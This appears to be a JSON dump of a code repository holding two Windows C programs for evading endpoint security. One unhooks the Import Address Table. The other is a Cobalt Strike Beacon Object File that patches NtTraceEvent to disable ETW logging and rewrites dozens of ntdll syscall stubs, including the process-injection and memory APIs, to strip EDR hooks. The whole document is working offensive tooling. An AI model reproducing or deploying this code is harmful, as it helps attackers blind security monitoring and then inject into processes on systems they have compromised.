          "content": "#include <winternl.h>\n#include <windows.h>\n#include <stdio.h>\n#include <stdbool.h>\n#include <dbghelp.h>\n#pragma comment (lib, \"dbghelp.lib\")\n\n//coded by xalicex\n//Twitter : @AliceCliment\n\nvoid UnhookIAT() {\n\n\tULONG size;\n\tDWORD i, j, x;\n\tDWORD oldProtect = 0;\n\tBOOL found = false;\n\tint sizetab;\n\tLPVOID TrueRVA;\n\t\n\tunsigned char xKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };\n\tunsigned char xVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };\n\ttypedef BOOL (WINAPI * VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);\n\tVirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) xKernel32), (LPCSTR) xVirtualProtect);\n\n\t// get Base address of the PE\n\tHANDLE baseAddress = GetModuleHandle(NULL);\t\t\n\t\n\t// get Import Table of PE\n\tPIMAGE_IMPORT_DESCRIPTOR importTbl = (PIMAGE_IMPORT_DESCRIPTOR) ImageDirectoryEntryToDataEx(\n\t\t\t\t\t\t\t\t\t\t\t\tbaseAddress,\n\t\t\t\t\t\t\t\t\t\t\t\tTRUE,\n\t\t\t\t\t\t\t\t\t\t\t\tIMAGE_DIRECTORY_ENTRY_IMPORT,\n\t\t\t\t\t\t\t\t\t\t\t\t&size,\n\t\t\t\t\t\t\t\t\t\t\t\tNULL);\n\n\t\n\tint nbelement = (size/20)-1;\n\tfor (i = 0; i < nbelement ; i++){\n\t\t\n\t\t//Get name of the DLL in the Import Table\n\t\tchar * importName = (char *)((PBYTE) baseAddress + importTbl[i].Name);\n\t\tprintf(\"DLL name in IAT : %s\\n\",importName);\n\t\t\n\t\t//Get Import Lookup Table (OriginalFirstThunk) and Import Address Table (FirstThunk)\n\t\tPIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA) ((PBYTE) baseAddress + importTbl[i].FirstThunk);\n\t\tPIMAGE_THUNK_DATA originalFirstThunk = (PIMAGE_THUNK_DATA) ((PBYTE) baseAddress + importTbl[i].OriginalFirstThunk);\n\t\tPIMAGE_IMPORT_BY_NAME function = NULL; \n\t\tchar* functionName;\n\t\t\n\t\t//Parse DLL loaded in memory to retrieve various info\n\t\tconst LPVOID BaseDLLAddr = (LPVOID)GetModuleHandle((LPCSTR)importName);\n\t\tPIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) BaseDLLAddr;\n\t\tPIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) BaseDLLAddr + pImgDOSHead->e_lfanew);\n\t\tPIMAGE_EXPORT_DIRECTORY pImgExpDir =(PIMAGE_EXPORT_DIRECTORY)((LPBYTE)BaseDLLAddr+pImgNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n\t\tPDWORD Address=(PDWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfFunctions);\n\t\tPDWORD Name=(PDWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfNames);\n\t\tPWORD Ordinal=(PWORD)((LPBYTE)BaseDLLAddr+pImgExpDir->AddressOfNameOrdinals);\n\n\t\t//loop through all function in the lookup table for the current dll\n\t\twhile (originalFirstThunk->u1.AddressOfData != NULL){\n\t\t\t\n\t\t\tfunction = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)baseAddress + originalFirstThunk->u1.AddressOfData);\n\t\t\tfunctionName = function->Name;\n\t\t\tsizetab = 7;\n\t\t\t//Avoid those function or I'll crash\n\t\t\tchar* exclude[]= {\"EnterCriticalSection\",\"LeaveCriticalSection\",\"DeleteCriticalSection\",\"InitializeSListHead\",\"HeapAlloc\",\"HeapReAlloc\",\"HeapSize\"};\n\t\t\tfor (x = 0; x < sizetab ; x++){\n\t\t\t\tif(_stricmp(functionName, exclude[x]) == 0){\n\t\t\t\t\tfound = true;\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tif(!found)\n\t\t\t{\n\t\t\t\t//Get RVA from DLL loaded in memory\n\t\t\t\tfor(j=0;j<pImgExpDir->NumberOfFunctions;j++){\n\t\t\t\t\tif(!strcmp(functionName,(char*)BaseDLLAddr+Name[j])){\n\t\t\t\t\t\tTrueRVA = (PVOID)((LPBYTE)Address[Ordinal[j]]);\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\n\t\t\t\t//Compute real address\n\t\t\t\tuintptr_t moduleBase = (uintptr_t)BaseDLLAddr;\n\t\t\t\tuintptr_t RVA = (uintptr_t)TrueRVA;\n\t\t\t\tuintptr_t* TrueAddress = (uintptr_t*)(moduleBase + RVA);\n\t\t\t\tPROC * currentFuncAddr = (PROC *) &thunk->u1.Function;\n\n\t\t\t\tif(*currentFuncAddr != (PROC)(TrueAddress)) {\n\t\t\t\t\toldProtect = 0;\n\t\t\t\t\tVirtualProtect_p((LPVOID) currentFuncAddr, 8, PAGE_READWRITE, &oldProtect); \n\t\t\t\t\tprintf(\"Bad News ! Function %s is hooked ! Address is %x and it's suppose to be %x \\nUnhook like the captain !\\n\",functionName, *currentFuncAddr, TrueAddress);\n\t\t\t\t\t*currentFuncAddr = (PROC)(TrueAddress);\n\t\t\t\t\tVirtualProtect_p((LPVOID) currentFuncAddr, 8, oldProtect, &oldProtect);\n\t\t\t\t}else{\n\t\t\t\t\tprintf(\"Good news ! Function %s is not hooked :D\\n\",functionName);\n\t\t\t\t}\n\t\t\t}\n\t\t\t++originalFirstThunk;\n\t\t\t++thunk;\n\t\t\tfound = false;\n\t\t}\n\t}\n}\n\n\nint main(void) {\n   \n\tUnhookIAT();\n\t\n\treturn 0;\n}\n"
        },
        {
          "name": "unhook_bof.c",
          "type": "blob",
          "size": 7.55859375,
          "content": "#include <Windows.h>\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include \"beacon.h\"\n\n#define DEBUG TRUE\n#undef DEBUG\n\n#define printf(format, args...) { BeaconPrintf(CALLBACK_OUTPUT, format, ## args); }\n\nDECLSPEC_IMPORT FARPROC WINAPI kernel32$GetProcAddress(HANDLE, CHAR*);\nDECLSPEC_IMPORT HANDLE WINAPI kernel32$LoadLibraryA(CHAR*);\n\nVOID *GetFileFromDisk(CHAR *name, HANDLE *hFile, HANDLE *hMap);\nVOID PatchHook(CHAR* address, unsigned char id, char high);\nVOID PatchAPI(VOID *lib, CHAR *name, HANDLE hDll, BOOL *displayed);\nFARPROC Resolver(CHAR *lib, CHAR *func);\n\nFARPROC Resolver(CHAR *lib, CHAR *func) {\n    FARPROC ptr = kernel32$GetProcAddress(kernel32$LoadLibraryA(lib), func);\n#ifdef DEBUG\n    printf(\"%s$%s located at 0x%p\\n\", lib, func, ptr);\n#endif\n    return ptr;\n}\n\nVOID *GetFileFromDisk(CHAR *name, HANDLE *hFile, HANDLE *hMap) {\n\t\tFARPROC CreateFile = Resolver(\"kernel32.dll\", \"CreateFileA\");\n\t\tFARPROC CreateFileMapping = Resolver(\"kernel32.dll\", \"CreateFileMappingA\");\n\t\tFARPROC MapViewOfFile = Resolver(\"kernel32.dll\",\"MapViewOfFile\");\n\n        VOID *data = NULL;\n        HANDLE localHFile = *hFile;\n        HANDLE localHMap = *hMap;\n        localHFile = CreateFile(name, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n        localHMap = CreateFileMapping(localHFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);\n        data = MapViewOfFile(localHMap, FILE_MAP_READ, 0, 0, 0);\n\n        hFile = &localHFile;\n        hMap = &localHMap;\n\n        return data;\n}\n\nVOID PatchAPI(VOID *lib, CHAR *name, HANDLE hDll, BOOL *displayed) {\n\tFARPROC GetProcAddress = Resolver(\"kernel32.dll\", \"GetProcAddress\");\n\tFARPROC strcmp = Resolver(\"msvcrt.dll\", \"strcmp\");\n\t\n    DWORD dwIter = 0;\n    CHAR* base = lib;\n    CHAR* PE = base + (unsigned char)*(base + 0x3c);\n    DWORD ExportDirectoryOffset = *((DWORD*)PE + (0x8a / 4));\n    CHAR* ExportDirectory = base + ExportDirectoryOffset;\n    DWORD dwFunctionsCount = *((DWORD*)ExportDirectory + (0x14 / 4));\n    DWORD OffsetNamesTableOffset = *((DWORD*)ExportDirectory + (0x20 / 4));\n    DWORD* OffsetNamesTable = base + OffsetNamesTableOffset;\n    DWORD OffsetOrdinals = *((DWORD*)ExportDirectory + (0x24 / 4));\n    WORD* ordinals = base + OffsetOrdinals;\n    DWORD OffsetFunctions = *((DWORD*)ExportDirectory + (0x1c / 4));\n    DWORD* functions = base + OffsetFunctions;\n\n\tif(!*displayed) {\n\t\tprintf(\"------------------------------------------\\nBASE\\t\\t\\t0x%p\\t%s\\nPE\\t\\t\\t0x%p\\t%s\\nExportTableOffset\\t\\t0x%p\\nOffsetNameTable\\t\\t0x%p\\nOrdinalTable\\t\\t0x%p\\nFunctionTable\\t\\t0x%p\\nFunctions Count\\t\\t0x%x (%d)\\n------------------------------------------\\n\",\n\t\tbase, base, PE, PE, ExportDirectory, OffsetNamesTable, ordinals, functions, dwFunctionsCount, dwFunctionsCount);\n\t\t*displayed = TRUE;\n\t}\n\t\n    for(dwIter; dwIter < dwFunctionsCount - 1; dwIter++) {\n        DWORD64 offset = *(OffsetNamesTable + dwIter);\n        CHAR* current = base + offset;\n        if(strcmp(current, name) == 0) {\n            WORD offsetInOrdinal = *(ordinals + dwIter);\n            DWORD function = *(functions + offsetInOrdinal);\n            CHAR *func = base + function + 4;\n            DWORD *data = (DWORD*)func;\n            DWORD syscallID = *data;\n            unsigned char id = syscallID;\n            unsigned char high = syscallID >> 8;\n\t\t\t\n            FARPROC toPatchAddr = GetProcAddress(hDll, name);\n\t\t\t\n\t\t\tprintf(\"%s syscall ID is 0x%02x%02x. Real %s is at 0x%p\\n\", name, (unsigned char)high, (unsigned char)id, name, toPatchAddr);\n\t\t\t\n            PatchHook(toPatchAddr, id, high);\n            break;\n        }\n    }\n\t\n}\n\nVOID PatchETW() {\n\tFARPROC VirtualProtect = Resolver(\"kernel32.dll\", \"VirtualProtect\");\n\tFARPROC memcpy = Resolver(\"msvcrt.dll\", \"memcpy\");\n\tprintf(\"Loading the ETW unhooking module\\n\");\n\tFARPROC NtEventTrace = Resolver(\"ntdll.dll\", \"NtTraceEvent\");\n\tDWORD dwOld;\n\tCHAR patch[] = \"\\xc3\\x90\\x90\";\n    VirtualProtect(NtEventTrace, 3, PAGE_EXECUTE_READWRITE, &dwOld);\n    memcpy(NtEventTrace, patch, 3);\n    VirtualProtect(NtEventTrace, 3, PAGE_EXECUTE_READ, &dwOld);\n}\n\nVOID PatchHook(CHAR* address, unsigned char id, char high) {\n\tFARPROC GlobalAlloc = Resolver(\"kernel32.dll\", \"GlobalAlloc\");\n\tFARPROC GlobalFree = Resolver(\"kernel32.dll\", \"GlobalFree\");\n\tFARPROC VirtualProtect = Resolver(\"kernel32.dll\", \"VirtualProtect\");\n\tFARPROC sprintf = Resolver(\"msvcrt.dll\", \"sprintf\");\n\tFARPROC memcpy = Resolver(\"msvcrt.dll\", \"memcpy\");\n\t\n\t\n    DWORD dwSize = 11;\n    CHAR* patch_address = address;\n\tCHAR* patch = GlobalAlloc(GPTR, dwSize);\n    sprintf(patch, \"\\x4c\\x8b\\xd1\\xb8%c%c%c%c\\x0f\\x05\\xc3\", id, high, high ^ high, high ^ high);\n\n    DWORD dwOld;\n    VirtualProtect(patch_address, dwSize, PAGE_EXECUTE_READWRITE, &dwOld);\n    memcpy(patch_address, patch, dwSize);\n    VirtualProtect(patch_address, dwSize, PAGE_EXECUTE_READ, &dwOld);\n\tGlobalFree(patch);\t\n}\n\nint go(char *args, int length) {\n\tPatchETW();\n\tprintf(\"Loading the unhooking module\\n\");\n\tFARPROC LoadLibrary = Resolver(\"kernel32.dll\", \"LoadLibraryA\");\n\tFARPROC CloseHandle = CloseHandle = Resolver(\"kernel32.dll\", \"CloseHandle\");\n\tFARPROC GetCurrentProcessId = Resolver(\"kernel32.dll\", \"GetCurrentProcessId\");\n\n    CHAR dll[] = \"C:\\\\windows\\\\system32\\\\ntdll.dll\";\n    HANDLE hFile = NULL;\n    HANDLE hMap = NULL;\n    HANDLE hDll = LoadLibrary(dll);\n\tBOOL displayed = FALSE;\n\t\n    printf(\"Opening %s\\n\", dll);\n\t\n    VOID *data = GetFileFromDisk(dll, &hFile, &hMap);\n    \n\tPatchAPI(data, \"NtProtectVirtualMemory\", hDll, &displayed); // should always be first\n\tPatchAPI(data, \"NtMapViewOfSection\", hDll, &displayed);\n\tPatchAPI(data, \"NtMapViewOfSectionEx\", hDll, &displayed);\n\tPatchAPI(data, \"NtOpenProcess\", hDll, &displayed);\n\tPatchAPI(data, \"NtAllocateVirtualMemory\", hDll, &displayed);\n\tPatchAPI(data, \"NtAllocateVirtualMemoryEx\", hDll, &displayed);\n\tPatchAPI(data, \"NtGetContextThread\", hDll, &displayed);\n\tPatchAPI(data, \"NtQueryInformationThread\", hDll, &displayed);\n\tPatchAPI(data, \"NtQueueApcThread\", hDll, &displayed);\n\tPatchAPI(data, \"NtQueueApcThreadEx\", hDll, &displayed);\n\tPatchAPI(data, \"NtReadVirtualMemory\", hDll, &displayed);\n\tPatchAPI(data, \"NtResumeThread\", hDll, &displayed);\n\tPatchAPI(data, \"NtSetContextThread\", hDll, &displayed);\n\tPatchAPI(data, \"NtSetInformationProcess\", hDll, &displayed);\n\tPatchAPI(data, \"NtSetInformationThread\", hDll, &displayed);\n\tPatchAPI(data, \"NtSuspendThread\", hDll, &displayed);\n\tPatchAPI(data, \"NtUnmapViewOfSection\", hDll, &displayed);\n\tPatchAPI(data, \"NtUnmapViewOfSectionEx\", hDll, &displayed);\n\tPatchAPI(data, \"NtWriteVirtualMemory\", hDll, &displayed);\n\tPatchAPI(data, \"NtCreateThreadEx\", hDll, &displayed);\n\tPatchAPI(data, \"NtCreateThread\", hDll, &displayed);\n\tPatchAPI(data, \"NtCreateUserProcess\", hDll, &displayed);\n\tPatchAPI(data, \"NtCreateProcess\", hDll, &displayed);\n\tPatchAPI(data, \"NtCreateProcessEx\", hDll, &displayed);\n\tPatchAPI(data, \"NtAlertResumeThread\", hDll, &displayed);\n\tPatchAPI(data, \"NtQuerySystemInformation\", hDll, &displayed);\n\tPatchAPI(data, \"NtQuerySystemInformationEx\", hDll, &displayed);\n\tPatchAPI(data, \"NtCreateFile\", hDll, &displayed);\n\tPatchAPI(data, \"NtCreateKey\", hDll, &displayed);\n\tPatchAPI(data, \"NtOpenKey\", hDll, &displayed);\n\tPatchAPI(data, \"NtOpenFile\", hDll, &displayed);\n\tPatchAPI(data, \"NtTerminateThread\", hDll, &displayed);\n\tPatchAPI(data, \"NtSetValueKey\", hDll, &displayed);\n\tPatchAPI(data, \"NtOpenKeyEx\", hDll, &displayed);\n\tPatchAPI(data, \"NtDeleteFile\", hDll, &displayed);\n\tPatchAPI(data, \"NtDeleteKey\", hDll, &displayed);\n\tPatchAPI(data, \"NtDeleteValueKey\", hDll, &displayed);\n\n  CloseHandle(hFile);\n  CloseHandle(hMap);\n\t \n\tprintf(\"Everything should be unhooked in the process with PID: %d\\n\", GetCurrentProcessId());\n\n  return 0;\n}\n"
        }
      ]
    }
  ]
}